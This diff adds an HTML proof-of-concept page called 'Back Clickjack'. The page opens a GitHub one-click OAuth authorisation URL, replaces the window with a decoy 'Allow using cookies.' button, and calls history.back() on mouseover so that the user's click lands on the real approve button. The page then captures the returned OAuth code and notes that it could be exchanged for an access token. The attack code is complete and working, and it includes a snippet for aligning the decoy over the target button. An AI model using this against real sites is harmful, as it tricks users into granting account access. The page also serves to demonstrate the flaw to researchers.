@@ -1,0 +1,60 @@
+<!DOCTYPE html>
+<html>
+<head>
+  <title>Back Clickjack</title>
+  <link rel="prerender" href="https://css-tricks.com">
+  
+</head>
+<body>
+
+<script>
+
+function attack(){
+  w=window.open(target.value);
+
+  setTimeout(function(){ 
+    w.location = 'data:text/html,<button style="'+xy.value+'" onmouseover="console.log(1);history.back()">Allow using cookies.</button>'
+  }, 5000)
+}
+
+if(location.href.indexOf('code=') != -1){
+  code = location.href.substring(location.href.indexOf('code='));
+  alert("Now we have "+code+" that we can use to get access_token and access your account. By the way, audit your https://github.com/settings/applications")
+}
+
+</script>
+
+
+<p>BackClickJack is a simple trick based on opening a window with your Target URL, then navigating to your Game URL, that somehow tricks user into clicking in certain location. Then onmouseover we do w.history.back() and the click lands inside the Target URL.</p>
+
+<p>Now it autofocuses on the new window and waits for Target URL to load. However using popunder system we can do the loading in background. It's just a PoC.</p>
+
+<p>Target URL (usually one-click OAuth is best target)</p>
+
+<p><input type="text" id=target value="https://github.com/login/oauth/authorize?client_id=89080077621f82fb1b07&redirect_uri=https://homakov.github.io/backclickjack.html"></p>
+
+<p>Inspect target button in Web Inspector and run this code for better styling</p>
+<pre>
+targetButton = $0; 
+bounds = targetButton.getBoundingClientRect(); 
+styles = `
+top: ${bounds.top};
+left: ${bounds.left};
+width: ${bounds.width};
+height: ${bounds.height};
+position: absolute;
+background-color: ${targetButton.style['background-color']};
+`</pre>
+
+<p><textarea id=xy>
+top: 410;
+left: 345;
+width: 172.78125;
+height: 34;
+position: absolute;
+background-color: #6cc644;
+</textarea></p>
+
+<p><input type=submit onclick=attack() value="Attack"></p>
+</body>
+</html>
